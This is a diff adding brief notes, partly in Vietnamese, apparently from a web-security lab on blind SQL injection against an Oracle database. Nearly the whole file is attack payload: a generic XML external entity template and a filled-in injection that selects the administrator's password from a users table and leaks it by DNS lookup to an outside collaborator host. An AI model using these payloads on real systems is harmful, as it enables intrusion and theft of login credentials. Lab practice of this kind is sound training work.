@@ -1,0 +1,9 @@
+tuong tu nhu bai tren 
+end goal : detect pw of admin
+
+
+dns:z33fz88d24afbptvb8imx5n6bxhn5c.oastify.com
+ 
+ 	SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual 
+
+' || (SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password from users where username = 'administrator')||'.z33fz88d24afbptvb8imx5n6bxhn5c.oastify.com/"> %remote;]>'),'/l') FROM dual)-- 
